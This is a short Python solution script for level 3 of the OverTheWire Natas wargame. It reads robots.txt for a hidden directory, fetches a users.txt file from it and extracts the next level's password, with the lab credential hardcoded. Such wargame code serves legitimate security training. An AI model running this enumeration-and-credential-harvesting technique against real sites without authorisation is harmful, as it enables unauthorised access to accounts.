#!/usr/bin/python3

import requests
import re

level = 3
username = 'natas%s' % level
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
url = 'http://%s.natas.labs.overthewire.org/' % username

# Check the robots.txt file for secret folders
response = requests.get(url + 'robots.txt', auth=(username, password))
forbidden_dir = re.findall('Disallow: (.*)', response.text)[0]

secret_response = requests.get(url + forbidden_dir, auth=(username, password))
# This returns the location of a users.txt file - this likely contains the key
users_response = requests.get(url + forbidden_dir + '/users.txt', auth=(username, password))

password = re.findall('natas%s:(.*)' % str(level+1), users_response.text)[0]

print(password)

